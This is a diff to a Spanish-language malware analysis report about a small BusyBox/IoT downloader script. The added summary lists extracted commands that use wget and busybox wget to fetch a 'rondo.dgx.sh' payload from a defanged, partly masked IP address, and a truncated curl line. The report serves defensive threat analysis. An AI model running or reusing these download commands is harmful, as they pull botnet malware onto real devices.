@@ -4,7 +4,11 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 469 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `rondo` en `hxxp://45.153.34.XXX/rondo`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 469 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `rondo` en `hxxp://45.153.34.XXX/rondo`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `wget -qO- hxxp://45.153.34.XXX/rondo.''dgx.sh`
+2. `busybox wget -qO- hxxp://45.153.34.XXX/rondo.''dgx.sh`
+3. `curl -s hxxp://45` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932.md](../../../../../malware-like/oraculo/downloader/a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932.md)
 
 
 ## 🏷️ Clasificación
